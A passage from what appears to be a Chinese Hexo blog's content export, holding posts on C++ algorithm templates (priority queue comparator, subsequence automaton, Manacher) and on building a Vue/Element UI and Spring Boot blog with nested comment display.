<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    Stu(<span class="keyword">int</span> age1, <span class="built_in">string</span> name1)&#123;</span><br><span class="line">        age = age1;</span><br><span class="line">        name = name1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyCmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> Stu &amp;a, <span class="keyword">const</span> Stu &amp;b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.age == b.age) <span class="keyword">return</span> a.name &gt; b.name;</span><br><span class="line">        <span class="keyword">return</span> a.age &gt; b.age;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, MyCmp &gt;que1;</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"yalexin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"axin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"aaaaa"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"bbbbb"</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!que1.empty())&#123;</span><br><span class="line">        Stu top = que1.top();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"age ： "</span> &lt;&lt; top.age &lt;&lt; <span class="string">", name : "</span> &lt;&lt; top.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        que1.pop(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两种方法的结果都一样。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>序列自动机模板</title>
    <url>/2021/04/10/%E5%BA%8F%E5%88%97%E8%87%AA%E5%8A%A8%E6%9C%BA%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="算法背景"><a href="#算法背景" class="headerlink" title="算法背景"></a>算法背景</h2><p>子序列的匹配，当然如果只是少量的模式串，直接使用双指针进行模拟即可，如果遇到大量模式串需要进行匹配，那么可以为主串维护一个DFA，对每一个模式串匹配时间复杂度都是<code>O(n)</code>.</p>
<p>算法的大致思想是为每一个主串的字符节点创建一个下一个字符的索引节点，方便状态快速转换。<a id="more"></a></p>
<h2 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 初态是 0 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nxt[MAX_N + <span class="number">1</span>][<span class="number">27</span>];</span><br><span class="line">    <span class="keyword">int</span> strLen = s.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; i++) nxt[strLen][i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length(); i; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) nxt[i - <span class="number">1</span>][j] = nxt[i][j];</span><br><span class="line">        nxt[i - <span class="number">1</span>][s[i - <span class="number">1</span>] - <span class="string">'a'</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>“算法”</tag>
        <tag>自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>马拉车算法模板</title>
    <url>/2021/03/04/%E9%A9%AC%E6%8B%89%E8%BD%A6%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>马拉车算法是Manacher算法，它是一位名叫Manacher的人在1975年提出的一种算法，用于在线性时间内解决回文串问题。<a id="more"></a></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>忙活了一个晚上，终于把这个高效的算法掌握了，该算法时间复杂度为<code>O(N)</code>,空间复杂度也为<code>O(N)</code>。</p>
<p>哈哈哈哈哈哈哈，我目前还没有能够把它讲通，有兴趣的可以参考下面的链接进行理解。</p>
<p>参考链接：</p>
<ul>
<li><p><a href="https://www.zhihu.com/question/330983016" target="_blank" rel="noopener">怎么理解“马拉车“manacher算法？</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1rE411x78x" target="_blank" rel="noopener">Manacher（马拉车）</a></p>
</li>
</ul>
<p>题目链接：<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">LeetCode-最长回文子串</a></p>
<p><code>AC</code>代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123; <span class="keyword">return</span> manacher(s); &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">manacher</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = preProcess(s);</span><br><span class="line">        <span class="keyword">int</span> C = <span class="number">0</span>, R = <span class="number">0</span>, i_mirror, len = <span class="built_in">strlen</span>(str.c_str()), p[<span class="number">2003</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            i_mirror = <span class="number">2</span> * C - i;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; R) &#123;</span><br><span class="line">                <span class="comment">// 利用对称性，但是要防止超过右边界</span></span><br><span class="line">                p[i] = min(p[i_mirror], R - i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 利用中心扩展法进行暴力</span></span><br><span class="line">            <span class="keyword">while</span> (str[i + p[i]] == str[i - p[i]]) p[i]++;</span><br><span class="line">            <span class="comment">// 判断是否需要更新 R</span></span><br><span class="line">            <span class="keyword">if</span> (i + p[i] &gt; R) &#123;</span><br><span class="line">                C = i;</span><br><span class="line">                R = i + p[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找出最长回文串的长度并进行截取</span></span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> centerIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[i] &gt; maxLen) &#123;</span><br><span class="line">                maxLen = p[i];</span><br><span class="line">                centerIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start = (centerIndex - maxLen) / <span class="number">2</span>;  <span class="comment">//原字符串下标</span></span><br><span class="line">        <span class="keyword">return</span> s.substr(start, maxLen - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">preProcess</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.length(), j = <span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">t</span><span class="params">(<span class="number">2003</span>, <span class="string">'\0'</span>)</span></span>;</span><br><span class="line">        t[j++] = <span class="string">'^'</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            t[j++] = <span class="string">'#'</span>;</span><br><span class="line">            t[j++] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        t[j++] = <span class="string">'#'</span>;</span><br><span class="line">        t[j++] = <span class="string">'$'</span>;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>二级评论展示的实现方法</title>
    <url>/2021/03/01/%E4%BA%8C%E7%BA%A7%E8%AF%84%E8%AE%BA%E5%B1%95%E7%A4%BA%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常的博客评论展示有一级评论、二级评论、多级评论，不同的展示方法给用户的体验不一样。</p>
<a id="more"></a>

<h2 id="一级评论"><a href="#一级评论" class="headerlink" title="一级评论"></a>一级评论</h2><p>顾名思义，就是所有评论（回复）是同级关系，这样子是设计简单，查询迅速，表可以设计成：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段说明</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>主键</td>
</tr>
<tr>
<td>blog_id</td>
<td>所属博客的id</td>
</tr>
<tr>
<td>content</td>
<td>评论内容</td>
</tr>
</tbody></table>
<p>查询某一篇文章的评论时候可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t_comment WHERE blog_id &#x3D; 99;</span><br></pre></td></tr></table></figure>

<p>是不是非常的简单！</p>
<p>但是这样子用户体验就太差了，对于回复的评论，用户根本无法建立起回复的桥梁。</p>
<p><img src="https://qiniu.yalexin.top/%E4%B8%80%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
<h2 id="多级评论"><a href="#多级评论" class="headerlink" title="多级评论"></a>多级评论</h2><p>简单来说就是层层嵌套，每一条评论具有严格的父子关系。表格可以设计成：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>字段说明</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>主键</td>
</tr>
<tr>
<td>blog_id</td>
<td>所属博客的id</td>
</tr>
<tr>
<td>content</td>
<td>评论内容</td>
</tr>
<tr>
<td>parent_comment_id</td>
<td>父级评论id，顶层评论为-1</td>
</tr>
</tbody></table>
<p><code>JavaBean</code>设计：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> Long blogId;</span><br><span class="line">    <span class="keyword">private</span> Long parentCommentId;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; replyComments;</span><br><span class="line">    <span class="comment">// 省略set和get方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询的时候，对于每一条顶层评论，拿到顶层评论的<code>id</code>后，将该<code>id</code>作为参数，可以查出二级评论，将二级评论的<code>id</code>作为参数，可以查出三级评论……</p>
<p>借助<code>Mybatis</code>，查询语句可以写成：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"top.yalexin.rblog.mapper.CommentMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findTopCommentsByParentIdAndBlogId"</span> <span class="attr">resultMap</span>=<span class="string">"topComment"</span>&gt;</span></span><br><span class="line">        select * from t_comment as cmt where cmt.parent_comment_id=#&#123;parentId&#125; and cmt.blog_id=#&#123;blogId&#125; </span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"topComment"</span> <span class="attr">type</span>=<span class="string">"Comment"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"content"</span> <span class="attr">column</span>=<span class="string">"content"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"blogId"</span> <span class="attr">column</span>=<span class="string">"blog_id"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"parentCommentId"</span> <span class="attr">column</span>=<span class="string">"parent_comment_id"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这一步使得JDBC递归进行查询 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"replyComments"</span> <span class="attr">select</span>=<span class="string">"findTopCommentsByParentIdAndBlogId"</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">column</span>=<span class="string">"&#123;blogId=blog_id,parentId=id&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>查询结果类似于：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: [</span><br><span class="line">            &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 1,</span><br><span class="line">                replyComments:[</span><br><span class="line">                    &#123;</span><br><span class="line">                        id: 3,</span><br><span class="line">                        content: 'hello',</span><br><span class="line">                        parent_comment_id: 2,</span><br><span class="line">                        replyComments:[]</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: 4,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: []</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>类似的效果：</p>
<p><img src="https://qiniu.yalexin.top/%E5%A4%9A%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
<p>虽然看上去层级关系清晰明了，但是当回复树深度很大的时候，页面将变得十分难看，所以该方式也很少使用。</p>
<h2 id="二级评论"><a href="#二级评论" class="headerlink" title="二级评论"></a>二级评论</h2><p>该方式先把每一个顶级评论展示，然后每一个顶级评论下的所有评论都处理成二级评论</p>
<p>该方式查询过程也很简单，<strong>查询语句和多级评论的方式一样</strong>，需要改变的是查询结束后的处理：</p>
<p>如果将每一个顶级评论和该评论下的子孙评论看成一棵树的话，为每一个顶级评论创建一个replyCmts容器，那么我们可以递归进行，遇到叶节点时，将叶节点的父节点的replyComments设为空，同时将叶节点添加到replyCmts容器中，此时先前的父节点又变成了叶节点，此时就可以递归返回，直至处理完所有节点，下面是代码实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getTopCommentsByBlogId</span><span class="params">(Long blogId)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (blogId == <span class="keyword">null</span> || blogId &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    List&lt;Comment&gt; rawCmts = commentMapper.findTopCommentsByParentIdAndBlogId((<span class="keyword">long</span>) -<span class="number">1</span>, blogId);</span><br><span class="line">    <span class="keyword">return</span> getParent(rawCmts);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Comment&gt; <span class="title">getParent</span><span class="params">(List&lt;Comment&gt; rawComments)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对于每一个顶级回复</span></span><br><span class="line">    <span class="keyword">for</span> (Comment topComment : rawComments) &#123;</span><br><span class="line">        <span class="comment">// 将顶级评论的子孙评论归结到一个集合中</span></span><br><span class="line">        LinkedList&lt;Comment&gt; comments = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        List&lt;Comment&gt; replyCmtsByTopCmt = topComment.getReplyComments();</span><br><span class="line">        <span class="keyword">for</span> (Comment replyComment : replyCmtsByTopCmt) &#123;</span><br><span class="line">            handleChild(replyComment, comments);</span><br><span class="line"><span class="comment">//                replyComment.setReplyNickname(topComment.getId().toString());</span></span><br><span class="line">            replyComment.setReplyNickname(topComment.getNickname());</span><br><span class="line">        &#125;</span><br><span class="line">        topComment.setReplyComments(comments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rawComments;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理二级评论以及子评论</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleChild</span><span class="params">(Comment replyComment, List&lt;Comment&gt; parent)</span> </span>&#123;</span><br><span class="line">    List&lt;Comment&gt; grandchildren = replyComment.getReplyComments();</span><br><span class="line">    replyComment.setReplyComments(<span class="keyword">null</span>);</span><br><span class="line">    parent.add(replyComment);</span><br><span class="line">    <span class="keyword">for</span> (Comment grandChild : grandchildren) &#123;</span><br><span class="line"><span class="comment">//            grandChild.setReplyNickname(replyComment.getId().toString());</span></span><br><span class="line">        grandChild.setReplyNickname(replyComment.getNickname());</span><br><span class="line">        <span class="keyword">if</span> (grandChild.getReplyComments() != <span class="keyword">null</span>) handleChild(grandChild, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询结果：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: [</span><br><span class="line">            &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 1,</span><br><span class="line">                replyComments:[]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                id: 3,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 2,</span><br><span class="line">                replyComments:[]</span><br><span class="line">			&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: 4,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: []</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>该方式结合了一级评论和多级评论的优点，深得广大开发者的热爱。</p>
<p><img src="https://qiniu.yalexin.top/%E4%BA%8C%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>MySql</tag>
        <tag>java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Vue和Element UI搭建的博客前端界面</title>
    <url>/2021/02/07/%E5%9F%BA%E4%BA%8EVue%E5%92%8CElement-UI%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%89%8D%E7%AB%AF%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<p><a href="https://github.com/YaleXin/rblog/tree/relese-1.0" target="_blank" rel="noopener">项目地址</a></p>
<p><a href="https://yalexin.gitee.io/rblog-demo/index.html#">演示地址</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前我的<a href="https://www.yalexin.top/" target="_blank" rel="noopener">个人博客系统</a>是使用<code>SpringBoot</code>和<code>thymeleaf</code>模板引擎开发的，个人觉得还可以，最近突发奇想，何不借点时间，把博客重构一下，使用<code>Vue</code>作为前端，<code>SpringBoot</code>最为后端，前后端分离，继续夯实自己的实力。</p>
<a id="more"></a>

<h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>大概的思路是沿用大部分旧博客的后端逻辑，之前持久层是使用<code>JPA</code>，后面视具体情况而定，有可能换用<code>MyBatis</code>。</p>
<p>前端使用<code>Vue</code>作为模板引擎， 是当下很火的一个<code>JavaScript MVVM</code>库，它是以数据驱动和组件化的思想构建的，在国内十分流行，在这里也不得不崇拜一下尤大。</p>
<p><code>UI</code>部分，鉴于个人能力太菜，:D，使用原生三件套做出来的界面实在是太丑，只好借助第三方<code>UI</code>框架，这里采用<code>Element UI</code>，原本想使用<code>Bootstrap</code>，但是在<code>Vue</code>框架的前提下，使用<code>Element UI</code>上手会容易得多，毕竟，<code>ElementUI</code>就是基于<code>Vue 2.0</code>开发的，文档也是比较齐全，但是使用该框架的过程，我也踩了一些坑，这些坑在官方文档中都是没有说明白的：</p>
<ul>
<li><p><code>Backtop</code>组件需要是父节点的第一个子节点。</p>
</li>
<li><p><code>Select</code>选择器必须给其一个宽度，不然文字不显示</p>
</li>
<li><p>表格组件中如果想要实现单元格居中，需要给<code>el-table-column</code>组件一个属性<code>align=&quot;center&quot;</code></p>
</li>
</ul>
<h2 id="涉及到的项目"><a href="#涉及到的项目" class="headerlink" title="涉及到的项目"></a>涉及到的项目</h2><ul>
<li><a href="https://cn.vuejs.org/" target="_blank" rel="noopener"><code>Vue</code></a></li>
<li><a href="https://element.eleme.cn/" target="_blank" rel="noopener">Element UI</a></li>
<li><a href="http://axios-js.com/" target="_blank" rel="noopener">axios</a></li>
<li><a href="https://prismjs.com/" target="_blank" rel="noopener"><code>prism</code></a>(代码高亮)</li>
<li><a href="https://typo.sofi.sh/" target="_blank" rel="noopener"><code>typo.css</code></a>(文章样式)</li>
<li><a href="https://github.com/animate-css/animate.css" target="_blank" rel="noopener">animate.css</a> </li>
<li><a href="http://fancyapps.com/fancybox/" target="_blank" rel="noopener"><code>fancybox</code></a> </li>
<li><a href="https://github.com/zhaoxuhui1122/vue-markdown" target="_blank" rel="noopener">vue-markdown</a> </li>
<li><a href="https://www.jinrishici.com/" target="_blank" rel="noopener">今日诗词</a></li>
<li><a href="http://www.fontawesome.com.cn/" target="_blank" rel="noopener">Font Awesome</a></li>
<li>…</li>
</ul>
<h2 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h2><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><h4 id="首页"><a href="#首页" class="headerlink" title="==首页=="></a>==首页==</h4><p><img src="https://qiniu.yalexin.top/home.png" alt></p>
<p><img src="https://qiniu.yalexin.top/m-home.png" alt></p>
<h4 id="分类"><a href="#分类" class="headerlink" title="==分类=="></a>==分类==</h4><p><img src="https://qiniu.yalexin.top/ctgr.png" alt><br><img src="https://qiniu.yalexin.top/m-ctgr.png" alt></p>
<h4 id="标签"><a href="#标签" class="headerlink" title="==标签=="></a>==标签==</h4><p><img src="https://qiniu.yalexin.top/tag.png" alt><br><img src="https://qiniu.yalexin.top/m-tag.png" alt></p>
<h4 id="友链"><a href="#友链" class="headerlink" title="==友链=="></a>==友链==</h4><p><img src="https://qiniu.yalexin.top/link.png" alt><br><img src="https://qiniu.yalexin.top/m-link.png" alt></p>
<h4 id="留言"><a href="#留言" class="headerlink" title="==留言=="></a>==留言==</h4><p><img src="https://qiniu.yalexin.top/talk.png" alt><br><img src="https://qiniu.yalexin.top/m-talk.png" alt></p>
<h4 id="归档"><a href="#归档" class="headerlink" title="==归档=="></a>==归档==</h4><p><img src="https://qiniu.yalexin.top/archive.png" alt></p>
<p><img src="https://qiniu.yalexin.top/m-archive.png" alt></p>
<h4 id="文章详情"><a href="#文章详情" class="headerlink" title="==文章详情=="></a>==文章详情==</h4><p><img src="https://qiniu.yalexin.top/blog-1.png" alt></p>
<h4 id="赞赏"><a href="#赞赏" class="headerlink" title="==赞赏=="></a>==赞赏==</h4><p><img src="https://qiniu.yalexin.top/ap1.png" alt></p>
<h4 id="底部"><a href="#底部" class="headerlink" title="==底部=="></a>==底部==</h4><p><img src="https://qiniu.yalexin.top/m-footer.png" alt></p>
<h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><h4 id="登录界面"><a href="#登录界面" class="headerlink" title="==登录界面=="></a>==登录界面==</h4><p><img src="https://qiniu.yalexin.top/admin-login.png" alt></p>
<h4 id="博客列表"><a href="#博客列表" class="headerlink" title="==博客列表=="></a>==博客列表==</h4><p><img src="https://qiniu.yalexin.top/admin-blogList.png" alt></p>
<h4 id="编辑博客"><a href="#编辑博客" class="headerlink" title="==编辑博客=="></a>==编辑博客==</h4><p><img src="https://qiniu.yalexin.top/admin-blog-edit.png" alt></p>
<h4 id="分类管理"><a href="#分类管理" class="headerlink" title="==分类管理=="></a>==分类管理==</h4><p> <img src="https://qiniu.yalexin.top/admin-ctgr.png" alt> </p>
<h4 id="标签管理"><a href="#标签管理" class="headerlink" title="==标签管理=="></a>==标签管理==</h4><p> <img src="https://qiniu.yalexin.top/admin-tag.png" alt> </p>
<h4 id="评论管理"><a href="#评论管理" class="headerlink" title="==评论管理=="></a>==评论管理==</h4><p> <img src="https://qiniu.yalexin.top/admin-cmt.png" alt> </p>
<h4 id="用户信息"><a href="#用户信息" class="headerlink" title="==用户信息=="></a>==用户信息==</h4><p> <img src="https://qiniu.yalexin.top/admin-user.png" alt> </p>
<h2 id="前后端分离遇到的坑"><a href="#前后端分离遇到的坑" class="headerlink" title="前后端分离遇到的坑"></a>前后端分离遇到的坑</h2><h3 id="前端Date数据类型与数据库不一致"><a href="#前端Date数据类型与数据库不一致" class="headerlink" title="前端Date数据类型与数据库不一致"></a>前端Date数据类型与数据库不一致</h3><p>具体而言，是前端接收到的时间比数据库中慢8个小时，是因为我在数据库URL中设置了时区是亚洲上海，即东八区，而前后端传送数据时候默认使用UTC时间，因此前端接收的时候会自动减去8小时，这时候要么指定连接数据库时时区为UTC，要么指定数据传输使用的时区，例如在Spring Boot框架中可以这样设置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/blog?serverTimezone=Asia/Shanghai</span></span><br></pre></td></tr></table></figure>

<h3 id="axios使用delete方法，后端无法接收"><a href="#axios使用delete方法，后端无法接收" class="headerlink" title="axios使用delete方法，后端无法接收"></a>axios使用delete方法，后端无法接收</h3><p>一般使用put或者post方式时候，传送数据是这样子的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.put(<span class="string">"/admin/blog/add"</span>, &#123;</span><br><span class="line">	data: <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.blog)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;&#125;).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>spring boot 后台接收数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/add"</span>)</span><br><span class="line"><span class="function">ResponseEntity <span class="title">addBlog</span><span class="params">(@RequestBody HashMap json)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是当我使用类似的方法执行delete方法时候，后台一直抛异常</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Resolved [<span class="type">org.springframework.http.converter.HttpMessageNotReadableException</span>: <span class="type">Required</span> <span class="type">request</span> <span class="type">body</span> <span class="type">is</span> <span class="type">missing</span>: <span class="type">org.springframework.http.ResponseEntity</span> <span class="type">top.yalexin.rblog.controller.admin.AdminCommentController.deleteComment</span>(<span class="type">java.util.HashMap</span>)]</span><br></pre></td></tr></table></figure>

<p>后来查资料才知道delete的内部实现原理与其他几个的不太一样，需要如此设置data对象才可：</p>
